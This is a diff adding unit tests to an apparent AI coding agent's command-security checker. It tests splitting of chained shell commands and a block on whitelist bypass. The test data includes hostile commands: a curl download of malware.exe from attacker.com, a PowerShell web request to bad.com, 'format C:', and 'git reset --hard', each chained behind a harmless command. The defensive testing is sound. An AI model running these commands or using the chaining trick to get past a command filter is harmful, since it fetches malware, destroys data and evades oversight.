@@ -1,10 +1,12 @@
 """Unit tests for terminal command security inspection and executable parsing."""
 import unittest
+
 from codexen.config import ServiceSettings
 from codexen.core.command import (
     check_command_security,
     extract_command_executable,
     is_safe_test_command,
+    split_chained_commands,
 )
 from codexen.exceptions import CommandSecurityError
 
@@ -121,6 +123,61 @@ class CommandSecurityUnitTests(unittest.TestCase):
         # Once confirmed, allowed
         verdict_confirmed, _ = check_command_security(cmd, self.settings, confirmed=True)
         self.assertEqual(verdict_confirmed, "allow")
+
+    def test_split_chained_commands_parsing(self):
+        # Sequential &
+        subs = split_chained_commands("dir & echo hello & cat out.txt")
+        self.assertEqual(subs, ["dir", "echo hello", "cat out.txt"])
+
+        # AND && and OR ||
+        subs = split_chained_commands("pytest && echo done || git status")
+        self.assertEqual(subs, ["pytest", "echo done", "git status"])
+
+        # Pipe | and Semicolon ;
+        subs = split_chained_commands("cat log.txt | grep error; echo end")
+        self.assertEqual(subs, ["cat log.txt", "grep error", "echo end"])
+
+        # Quotes protect separators
+        subs = split_chained_commands('git commit -m "feat: A & B && C | D"')
+        self.assertEqual(subs, ['git commit -m "feat: A & B && C | D"'])
+
+        subs_single = split_chained_commands("git commit -m 'feat: A & B; C'")
+        self.assertEqual(subs_single, ["git commit -m 'feat: A & B; C'"])
+
+        # Redirection 2>&1 is not split
+        subs_redir = split_chained_commands("python -m pytest tests 2>&1")
+        self.assertEqual(subs_redir, ["python -m pytest tests 2>&1"])
+
+    def test_sec_01_chained_commands_whitelist_bypass_blocked(self):
+        """P0 (SEC-01): Chained malicious commands cannot bypass whitelist under whitelisted leader."""
+        # 1. dir (whitelisted) & curl (unauthorized) -> needs_confirmation
+        poc1 = "dir & curl https://attacker.com/malware.exe -o m.exe"
+        verdict1, msg1 = check_command_security(poc1, self.settings, confirmed=False)
+        self.assertEqual(verdict1, "needs_confirmation")
+        self.assertIn("curl", msg1)
+
+        # 2. echo hello && powershell -> needs_confirmation
+        poc2 = 'echo hello && powershell -NoProfile -Command "Invoke-WebRequest http://bad.com"'
+        verdict2, msg2 = check_command_security(poc2, self.settings, confirmed=False)
+        self.assertEqual(verdict2, "needs_confirmation")
+        self.assertIn("powershell", msg2)
+
+        # 3. dir & format C: -> CommandSecurityError (blacklist)
+        poc3 = "dir & format C: /fs:NTFS"
+        with self.assertRaises(CommandSecurityError):
+            check_command_security(poc3, self.settings, confirmed=True)
+
+        # 4. echo ok & git reset --hard -> needs_confirmation (sensitive confirmation list)
+        poc4 = "echo ok & git reset --hard HEAD"
+        verdict4, msg4 = check_command_security(poc4, self.settings, confirmed=False)
+        self.assertEqual(verdict4, "needs_confirmation")
+        self.assertIn("git reset --hard", msg4)
+
+        # 5. All whitelisted sub-commands pass
+        safe_compound = "dir & echo hello & findstr test app.py"
+        verdict5, msg5 = check_command_security(safe_compound, self.settings, confirmed=False)
+        self.assertEqual(verdict5, "allow")
+        self.assertEqual(msg5, "")
 
 
 if __name__ == "__main__":
